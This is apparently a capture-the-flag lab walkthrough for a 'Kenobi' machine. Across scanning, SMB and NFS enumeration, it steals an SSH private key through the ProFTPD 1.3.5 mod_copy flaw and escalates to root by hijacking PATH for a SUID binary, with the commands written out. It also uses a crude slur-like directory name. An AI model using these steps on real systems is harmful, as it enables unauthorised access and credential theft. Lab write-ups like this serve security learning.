</br> <b>nmap -p- -T5 10.10.54.111 -v</b>
</br>
</br>PORT      STATE SERVICE
</br>21/tcp    open  ftp
</br>22/tcp    open  ssh
</br>80/tcp    open  http
</br>111/tcp   open  rpcbind
</br>139/tcp   open  netbios-ssn
</br>445/tcp   open  microsoft-ds
</br>2049/tcp  open  nfs
</br>MAC Address: 02:E8:6D:E5:D9:27 (Unknown)

</br> going into greater detail with the found ports 
</br>**nmap 21,22,80,111,139,445,2049 -A 10.10.54.111 -v**
</br>
</br>PORT     STATE SERVICE     VERSION
</br>21/tcp   open  ftp         ProFTPD 1.3.5
</br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
</br>| ssh-hostkey: 
</br>|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
</br>|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
</br>|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
</br>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
</br>| http-methods: 
</br>|_  Supported Methods: POST OPTIONS GET HEAD
</br>| http-robots.txt: 1 disallowed entry 
</br>|_/admin.html
</br>|_http-server-header: Apache/2.4.18 (Ubuntu)
</br>|_http-title: Site doesn't have a title (text/html).
</br>111/tcp  open  rpcbind     2-4 (RPC #100000)
</br>| rpcinfo: 
</br> (binds and other weird info omitted)***
</br>|_  100227  2,3         2049/udp6  nfs_acl
</br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</br>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
</br>2049/tcp open  nfs_acl     2-3 (RPC #100227)
</br>MAC Address: 02:E8:6D:E5:D9:27 (Unknown)
</br>
</br>As per room instructions, we’re moving along to scan the identified SMBD port 445. We’re just using nmap scripts, but I’m pretty sure enum4linux <ip> would work too, if you had it on your atk machine. 
</br>
</br>**nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN mySMBScan 10.10.54.111**
</br>
</br>
</br>Nmap scan report for 10.10.54.111
</br>
</br>PORT    STATE SERVICE
</br>445/tcp open  microsoft-ds
</br>MAC Address: 02:E8:6D:E5:D9:27 (Unknown)
</br>
</br>Host script results:
</br>| smb-enum-shares: 
</br>|   account_used: guest
</br>|   \\10.10.54.111\IPC$: 
</br>|     Type: STYPE_IPC_HIDDEN
</br>|     **Comment: IPC Service (kenobi server (Samba, Ubuntu))**
</br>|     Users: 1
</br>|     Max Users: <unlimited>
</br>|     Path: C:\tmp
</br>|     Anonymous access: READ/WRITE
</br>|     Current user access: READ/WRITE
</br>|   \\10.10.54.111\anonymous: 
</br>|     Type: STYPE_DISKTREE
</br>|     Comment: 
</br>|     Users: 0
</br>|     Max Users: <unlimited>
</br>|     Path:** C:\home\kenobi\share**
</br> (omitted other lengthy trash)
</br>
</br>Interesting among the 3 items found is the inclusion of the non-standard name “kenobi” in the anonymous path. Other data appears default, so anonymous is our priority, especially since we might get anonymous login access. 
</br>
</br>the way that we access it is:
</br>**smbclient //10.10.54.111/anonymous**
</br>
</br>we transfer the file to our own machine with : get log.txt
</br>opening it up, we see some kind of key generation going on with making an rsa key pair.
</br>There’s other data about a proftp server, but it’s hard to read with a bunch of commented out lines…
</br>
</br>for unclear reasons, next we look at the RPC bind. 
</br>**nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.54.111**
</br>or
</br>**showmount -e 10.10.54.111**
</br>
</br>/var * is revealed
</br>
</br>Not sure what the purpose of that was, and the room doesn’t make it clear either. 
</br>Next, we look at the netcat version by connecting to it
</br>
</br>**nc 10.10.54.111 21**
</br>220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.54.111]
</br>
</br>searchsploit proftpd 1.3.5
</br>---------------------------------
 </br>Exploit Title                                |  Path
</br>----------------------------------------------
</br>ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
</br>ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
</br>ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
</br>ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
</br>----------------------------------------------
</br>
</br>Copy the ssh data: (from within the CLI)
</br>**SITE CPFR /home/kenobi/.ssh/id_rsa**
</br> “copy data from the indicated foreign path”
</br>
</br>**SITE CPTO /var/tmp/id_rsa**
</br>“and send that copied data to the indicated local path”

</br> set things up for the next stage...

</br>**mkdir /mnt/kenobiNFS**
</br>make a directory, using /mnt as the standard convention for where these kinds of mounting links are made (organizational convention)
</br>because it’s a convention, I’m going to change it to show how arbitrary it is to follow exactly.
</br>**mkdir ugay**
</br>
</br>**mount 10.10.54.111:/var ugay**
</br>Then actually get that remote directory from the ip, indicating the foreign directory we want, and linking it to the indicated local directory we just made
</br>
</br>(img omitted until I find my screencap folder for this...)
</br>then show the contents of the target dir, browsing as if it were on our local machine.
</br>Note how in /**tmp **we got the **idRSA,** since we copied that before with  the copy-from and copy-to commands.
</br>
</br>now, locally we can copy the id_rsa key to our current dir
</br>**cp ugay/tmp/id_rsa .**
</br> that ending period is important up there ^
</br>**sudo chhmod 600 id_rsa**
</br>**ssh -i id_rsa kenobi@10.10.54.111**
</br>
</br>use the rsa key we captured to get into ssh
</br>
</br>now, hunt for suid priv esc potential
</br>**find / -perm -u=s -type f 2>/dev/null**
</br>
</br>**usr/bin/menu**
</br>Above, that file seems to be customized somehow. Why? Don’t know, just figure it out through spidey sense magic, because the mentors didn’t explain squat. (*info gap identified)
</br>
</br>**echo /bin/sh > curl**
</br> basically copy pasta the binary for running shell into a program called curl; in programming, this is like shadowing a function, but we're doing it to a whole file
</br>**chmod 777 curl**
</br> give ourselves premissions
</br>**export PATH=/tmp:$PATH**
</br> jank up the path
</br>**/usr/bin/menu**
</br>run the menu file that has curl within it, but executes with root perms, so we can pop a root shell


